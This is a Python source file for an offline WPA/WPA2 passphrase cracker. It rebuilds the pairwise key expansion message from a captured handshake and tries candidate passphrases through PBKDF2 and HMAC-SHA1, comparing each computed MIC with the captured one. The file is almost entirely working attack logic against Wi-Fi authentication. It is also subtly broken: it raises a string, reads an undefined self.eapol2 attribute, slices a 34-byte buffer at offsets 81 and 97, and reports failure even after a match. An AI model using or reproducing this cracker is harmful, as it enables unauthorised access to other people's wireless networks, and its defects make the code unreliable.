import hashlib
import hmac
import pickle
import itertools
import random
import argparse
import sys

from string import ascii_letters, digits
from typing import (
    Tuple, 
    Union, 
    Dict,
    Any
)

from hcracker.models import *

class PassphraseCracker:
    def __init__(self, attack: Attack) -> None:
        self._attack = attack
        self._target = attack.target
        self._iteration = attack.iteration

        self.ssid = self._target.ssid
        self.eapols = self._attack.eapols

    def sort(self, in_1, in_2) -> Tuple[bytes]:
        if len(in_1) != len(in_2):
            raise "Lengths dont match!"

        in_1_byte_list = list(bytes(in_1))
        in_2_byte_list = list(bytes(in_2))

        for i in range(len(in_1_byte_list)):
            if in_1_byte_list[i] < in_2_byte_list[i]:
                return (in_2, in_1)
            elif in_1_byte_list[i] > in_2_byte_list[i]:
                return (in_1, in_2)

        return (in_1, in_2)

    def create_message(self) -> bytes:
        ap_mac = self._target.ap_mac
        sta_mac = self._target.sta_mac
        anonce = self._target.anonce
        snonce = self._target.snonce

        max_mac, min_mac = self.sort(ap_mac, sta_mac)
        max_nonce, min_nonce = self.sort(anonce, snonce)

        return b"".join([
            b"Pairwise key expansion\x00",
            min_mac,
            max_mac,
            min_nonce,
            max_nonce,
            b"\x00"
        ])

    def create_zeroed_frame(self) -> bytes:
        frame802 = open(self.eapol2, "rb").read()[:34]

        return b"".join([
            frame802[:81],
            b"\0" * 16,
            frame802[97:]
        ])

    @property
    def attack(self) -> Union[Target, str]:
        if not self._attack:
            return "Attack not defined"
        return self._attack

    def run(self) -> None:
        message = self.create_message()
        zeroed_frame = self.create_zeroed_frame()
        mic = self._target.mic

        for item in self._iteration:
            print(f"[*] Trying with: ----------------------> {''.join(item)}")

            passphrase = "".join(item).encode("utf-8")
            pmk = hashlib.pbkdf2_hmac("sha1", passphrase, self.ssid.encode("utf-8"), 4096, 32)
            kck = hmac.new(pmk, message, hashlib.sha1).digest()[:16]

            calculated_mic = hmac.new(kck, zeroed_frame, hashlib.sha1).digest()[:16]

            if mic == calculated_mic:
                print(f"\n[+] Password found: {passphrase.decode('utf-8')}\n")
                break

        print("\n[-] Password NOT found\n")

